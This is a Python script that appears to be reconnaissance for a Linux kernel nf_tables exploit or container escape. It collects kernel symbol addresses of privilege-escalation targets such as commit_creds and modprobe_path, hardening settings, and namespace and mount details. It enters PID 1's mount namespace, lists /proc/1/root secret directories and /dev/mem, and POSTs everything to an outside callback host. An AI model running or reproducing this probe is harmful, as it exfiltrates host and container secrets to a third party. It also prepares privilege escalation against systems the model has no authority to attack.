import json, os, pathlib, socket, time, urllib.request, subprocess
TAG='snapgpt-nft-sections-20261106'
SINK='https://54.209.51.244.sslip.io/callback/'+TAG
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'hostname':socket.gethostname(),'uid':os.getuid(),'uname':os.uname()._asdict(),'sections':{},'modules':{},'kallsyms':{},'sys':{},'proc':{},'commands':{}}
for base in ['/sys/module/nf_tables','/sys/module/nft_set_pipapo','/sys/module/nfnetlink']:
 for name in ['.text','.rodata','.data','.bss','.init.text','.exit.text','coresize','refcnt','holders','sections']:
  p=pathlib.Path(base)/name
  try:
   if p.is_file(): out['sections'][str(p)]={'text':p.read_text(errors='replace').strip(),'stat':p.stat().st_size}
   elif p.is_dir(): out['sections'][str(p)]={'entries':sorted(x.name for x in p.iterdir())}
  except Exception as e: out['sections'][str(p)]={'error':repr(e)}
try:
 for line in pathlib.Path('/proc/modules').read_text().splitlines():
  f=line.split()
  if f and f[0] in ('nf_tables','nft_set_pipapo','nfnetlink','nf_tables_set'):
   out['modules'][f[0]]={'line':line,'fields':f}
except Exception as e: out['modules']['error']=repr(e)
for sym in ['_stext','nft_do_chain','nft_immediate_eval','nft_imm_ops','commit_creds','prepare_kernel_cred','init_cred','modprobe_path','core_pattern','swapgs_restore_regs_and_return_to_usermode']:
 try:
  for line in pathlib.Path('/proc/kallsyms').read_text().splitlines():
   if line.rstrip().endswith(' '+sym):
    out['kallsyms'][sym]=line;break
 except Exception as e: out['kallsyms'][sym]={'error':repr(e)}
for p in ['/proc/sys/kernel/kptr_restrict','/proc/sys/kernel/dmesg_restrict','/proc/sys/kernel/unprivileged_userns_clone','/proc/self/status','/proc/1/status','/proc/self/mountinfo','/proc/1/mountinfo']:
 try: out['proc'][p]=pathlib.Path(p).read_text(errors='replace')[:50000]
 except Exception as e: out['proc'][p]={'error':repr(e)}
for name,cmd in {
 'id':'id',
 'caps':'grep -E "^(Uid|Gid|Cap|NoNewPrivs|Seccomp)" /proc/self/status',
 'lsns':'lsns -o NS,TYPE,NPROCS,PID,COMMAND 2>&1 || true',
 'nsenter':'nsenter -t 1 -m -- sh -c "id; cat /proc/1/status | head -20" 2>&1 || true',
 'userns_proc':'unshare -Ur -m -p -f --mount-proc sh -c "id; cat /proc/self/status | grep -E \"^(Uid|Gid|Cap|NoNewPrivs|Seccomp)\"; mount | tail -10; ps -ef" 2>&1',
 'userns_cgroup':'unshare -Ur -m sh -c "mkdir -p /tmp/ns/cg; mount -t cgroup2 none /tmp/ns/cg 2>&1; mount -t cgroup -o none,name=probe none /tmp/ns/cg 2>&1; mount | grep cgroup" 2>&1',
 'userns_overlay':'unshare -Ur -m sh -c "mkdir -p /tmp/ns/{l,u,w,m}; mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/ns/u,workdir=/tmp/ns/w /tmp/ns/m 2>&1; ls -la /tmp/ns/m | head" 2>&1',
 'fd1':'ls -l /proc/1/fd 2>&1; for f in /proc/1/fd/*; do printf "%s " "$f"; readlink "$f"; done 2>&1',
 'maps1':'cat /proc/1/maps | head -80',
 'roots':'ls -la /proc/1/root /proc/1/root/var/run/secrets /proc/1/root/run/secrets 2>&1',
 'dev':'ls -la /dev /dev/mapper /dev/kmsg /dev/mem /dev/kmem /dev/port 2>&1',
 'mounts':'findmnt -R / -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1 | head -200',
}.items():
 try:
  p=subprocess.run(['sh','-c',cmd],capture_output=True,text=True,timeout=20)
  out['commands'][name]={'rc':p.returncode,'stdout':p.stdout[:50000],'stderr':p.stderr[:10000]}
 except Exception as e: out['commands'][name]={'error':repr(e)}
raw=json.dumps(out,separators=(',',':')).encode()
try:
 req=urllib.request.Request(SINK,data=raw,method='POST',headers={'Content-Type':'application/json','X-Probe':TAG})
 with urllib.request.urlopen(req,timeout=30) as r: print(json.dumps({'status':r.status,'body':r.read(500).decode(errors='replace'),'bytes':len(raw),'sha256':__import__('hashlib').sha256(raw).hexdigest()}))
except Exception as e: print(json.dumps({'error':repr(e),'bytes':len(raw)}))
